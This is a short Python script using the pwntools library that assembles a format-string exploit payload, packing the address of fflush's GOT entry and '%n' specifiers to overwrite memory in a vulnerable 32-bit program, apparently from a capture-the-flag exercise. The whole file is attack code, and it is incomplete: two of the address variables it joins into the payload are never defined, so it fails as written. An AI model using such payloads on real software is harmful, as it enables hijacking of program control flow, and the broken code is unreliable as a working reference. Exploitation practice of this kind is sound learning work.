#!/usr/bin/env python3
from pwn import *

fflush_adr0 = p32(0x804a028)

#Establish the necessary inputs for our input, so we can write to the addresses
fmt_string0 = b"%10$n"
fmt_string1 = b"%11$n"
fmt_string2 = b"%12$n"

#Form the payload
payload = fflush_adr0 + fflush_adr1 + fflush_adr2 + fmt_string0 + fmt_string1 + fmt_string2
print(payload)